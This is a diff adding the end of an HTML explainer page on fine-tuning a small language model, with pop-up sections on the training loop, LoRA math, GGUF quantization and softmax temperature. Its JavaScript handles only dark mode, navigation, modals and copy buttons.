+  <p class="mb-3">Stripped down to the essential lines — this is exactly what Hugging Face's <code>Trainer</code> does for us:</p>
+  <pre class="bg-ibm-gray-100 dark:bg-ibm-gray-90 text-ibm-gray-10 p-4 text-sm overflow-x-auto"><code>optimizer = torch.optim.AdamW(model.parameters(), lr=2e-4)
+
+for epoch in range(num_epochs):
+    for batch in dataloader:
+        # 1. forward
+        outputs = model(**batch)
+        loss = outputs.loss
+
+        # 2. backward
+        loss.backward()
+
+        # 3. update
+        optimizer.step()
+        optimizer.zero_grad()</code></pre>
+  <p class="mt-4">Five lines do the work. The rest of Hugging Face is configuration around this core — batching, logging, checkpointing, distributed training.</p>
+</template>
+
+<template id="content-lora-deep">
+  <h3 class="font-serif font-bold text-2xl mb-3">The LoRA math, briefly</h3>
+  <p class="mb-3">A weight matrix in the model is called <code>W</code> — let's say it's 768 × 768 (about 590,000 numbers). LoRA replaces "tweak W directly" with this:</p>
+  <pre class="bg-ibm-gray-100 dark:bg-ibm-gray-90 text-ibm-gray-10 p-4 text-sm"><code>W_new = W_frozen + B × A
+
+where:
+  A is shape (8 × 768)   — 6,144 numbers
+  B is shape (768 × 8)   — 6,144 numbers</code></pre>
+  <p class="mt-4">The <code>8</code> is the "rank" — the only hyperparameter that really matters. We use 8.</p>
+  <p class="mt-3">During training we only update <code>A</code> and <code>B</code> — 12,288 numbers instead of 590,000 — a 50× saving per layer. At the end we precompute <code>B × A</code> once and add it into <code>W_frozen</code>. The result is a normal model file with no LoRA machinery at runtime.</p>
+</template>
+
+<template id="content-gguf-deep">
+  <h3 class="font-serif font-bold text-2xl mb-3">Quantization — why GGUF is small &amp; fast</h3>
+  <p class="mb-3">PyTorch weights are usually stored as 32-bit floating point numbers — 4 bytes each. For 135M parameters that's 540 MB.</p>
+  <p class="mb-3">GGUF can store the same weights at <em>lower precision</em>. Each weight takes fewer bits, but the model behaves almost the same. Common levels:</p>
+  <pre class="bg-ibm-gray-100 dark:bg-ibm-gray-90 text-ibm-gray-10 p-4 text-sm"><code>F32     32 bits/weight   full precision  100% size
+F16     16 bits/weight   half precision   50%
+Q8_0     8 bits/weight   tiny accuracy loss   25%
+Q4_K_M  ~4.5 bits/weight some quality loss   ~14%
+Q2_K     2 bits/weight   noticeable degradation 6%</code></pre>
+  <p class="mt-4">In this project we ship F16 because 135M is already tiny — quantizing further saves only a few MB and isn't worth the quality drop. For big models (7B+) you'll see Q4_K_M everywhere because it's a great trade-off.</p>
+</template>
+
+<template id="content-softmax-deep">
+  <h3 class="font-serif font-bold text-2xl mb-3">Softmax with real numbers</h3>
+  <p class="mb-3">Softmax turns raw scores ("logits") into probabilities. The formula:</p>
+  <pre class="bg-ibm-gray-100 dark:bg-ibm-gray-90 text-ibm-gray-10 p-4 text-sm"><code>softmax(x_i) = exp(x_i) / Σ exp(x_j)</code></pre>
+  <p class="mt-4 mb-3">Worked example. Logits: <code>[8.2, 7.5, 5.1, 1.0]</code></p>
+  <pre class="bg-ibm-gray-100 dark:bg-ibm-gray-90 text-ibm-gray-10 p-4 text-sm"><code>exp(8.2) = 3640
+exp(7.5) = 1808
+exp(5.1) =  164
+exp(1.0) =    2.7
+
+sum = 3640 + 1808 + 164 + 2.7 = 5615
+
+prob(herbs) = 3640 / 5615 = 0.648
+prob(food)  = 1808 / 5615 = 0.322
+prob(meat)  =  164 / 5615 = 0.029
+prob(bikes) =  2.7 / 5615 = 0.0005</code></pre>
+  <p class="mt-4">Temperature changes this. The model divides logits by T <em>before</em> softmax. T=2 makes everything flatter (more random). T=0.3 makes the highest probability dominate (more deterministic). We use T=0.6 — a nice middle ground.</p>
+</template>
+
+<!-- ============================ SCRIPTS ============================ -->
+<script>
+// ----- dark mode -----
+const root = document.documentElement;
+function applyTheme(t) {
+  if (t === 'dark') root.classList.add('dark');
+  else root.classList.remove('dark');
+}
+const stored = localStorage.getItem('theme');
+applyTheme(stored || (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'));
+
+document.getElementById('theme-toggle').addEventListener('click', () => {
+  const isDark = root.classList.contains('dark');
+  applyTheme(isDark ? 'light' : 'dark');
+  localStorage.setItem('theme', isDark ? 'light' : 'dark');
+});
+
+// ----- mobile nav -----
+const menuBtn = document.getElementById('menu-toggle');
+const mobileNav = document.getElementById('mobile-nav');
+menuBtn.addEventListener('click', () => mobileNav.classList.toggle('hidden'));
+mobileNav.querySelectorAll('a').forEach(a => a.addEventListener('click', () => mobileNav.classList.add('hidden')));
+
+// ----- scroll progress bar -----
+const bar = document.getElementById('progress');
+window.addEventListener('scroll', () => {
+  const h = document.documentElement;
+  const max = h.scrollHeight - h.clientHeight;
+  bar.style.width = max > 0 ? ((h.scrollTop / max) * 100) + '%' : '0';
+});
+
+// ----- modals -----
+const modal     = document.getElementById('modal');
+const modalBody = document.getElementById('modal-body');
+document.getElementById('modal-close').addEventListener('click', () => modal.close());
+modal.addEventListener('click', e => { if (e.target === modal) modal.close(); });
+
+document.querySelectorAll('[data-modal]').forEach(btn => {
+  btn.addEventListener('click', () => {
+    const tpl = document.getElementById('content-' + btn.dataset.modal);
+    if (!tpl) return;
+    modalBody.innerHTML = tpl.innerHTML;
+    if (typeof modal.showModal === 'function') modal.showModal();
+    else modal.setAttribute('open', '');
+  });
+});
+
+// ----- copy buttons -----
+document.querySelectorAll('.copy-btn').forEach(btn => {
+  btn.addEventListener('click', async () => {
+    const target = document.getElementById(btn.dataset.copyTarget);
+    if (!target) return;
+    try {
+      await navigator.clipboard.writeText(target.innerText);
+      const orig = btn.textContent;
+      btn.textContent = '✓ copied';
+      setTimeout(() => { btn.textContent = orig; }, 1500);
+    } catch (e) {
+      btn.textContent = 'copy failed';
+    }
+  });
+});
+</script>
+
+</body>
+</html>
